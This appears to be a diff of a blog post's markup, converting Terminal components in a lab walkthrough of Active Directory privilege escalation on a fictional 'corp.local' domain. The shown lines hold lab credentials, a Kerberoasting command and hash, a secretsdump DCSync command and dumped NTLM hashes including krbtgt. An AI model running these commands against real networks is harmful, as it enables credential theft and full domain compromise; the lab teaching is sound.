@@ -22,14 +22,12 @@ The commands here are the ones I run on real engagements. The targets are fictio
 
 Three boxes, one domain (`corp.local`), one cup of coffee:
 
-<Terminal title="lab/topology">
-{`DC01.corp.local      10.10.10.10   Windows Server 2019 (DC, GC)
+<Terminal title="lab/topology" code={`DC01.corp.local      10.10.10.10   Windows Server 2019 (DC, GC)
 SRV-FILE01           10.10.10.20   Windows Server 2019 (SMB, MSSQL)
 WS-DEV05             10.10.10.50   Windows 10  (dev workstation)
 
 # our user (initial foothold)
-corp\\jdoe : Summer2024!`}
-</Terminal>
+corp\\jdoe : Summer2024!`} />
 
 We'll assume `jdoe` is a regular domain user. No local admin anywhere. No GPO push. We're going to walk out as `Domain Admins`.
 
@@ -101,10 +99,8 @@ impacket-GetUserSPNs corp.local/jdoe:'Summer2024!' \
 
 A clean `spns.txt` looks like this:
 
-<Terminal title="impacket@kali">
-{`$krb5tgs$23$*SVC_SQL$CORP.LOCAL$MSSQLSvc/srv-file01.corp.local~1433*$
-  a91f2c... [snipped 1.2KB of hash] ...e88f`}
-</Terminal>
+<Terminal title="impacket@kali" code={`$krb5tgs$23$*SVC_SQL$CORP.LOCAL$MSSQLSvc/srv-file01.corp.local~1433*$
+  a91f2c... [snipped 1.2KB of hash] ...e88f`} />
 
 Then crack with hashcat. On a single RTX 3070 you're getting roughly 1.4 GH/s on mode 13100 — most reused passwords fall in seconds:
 
@@ -194,13 +190,11 @@ impacket-secretsdump -just-dc 'corp.local/bgreen:Backup#22'@10.10.10.10
 
 Output (truncated):
 
-<Terminal title="secretsdump@kali">
-{`Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+<Terminal title="secretsdump@kali" code={`Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Kerberos keys grabbed
 Administrator:aes256-cts-hmac-sha1-96:9a8c3...
-[*] Cleaning up...`}
-</Terminal>
+[*] Cleaning up...`} />
 
 That's the `krbtgt` hash. Game over — golden tickets, persistence, the full menu.
 
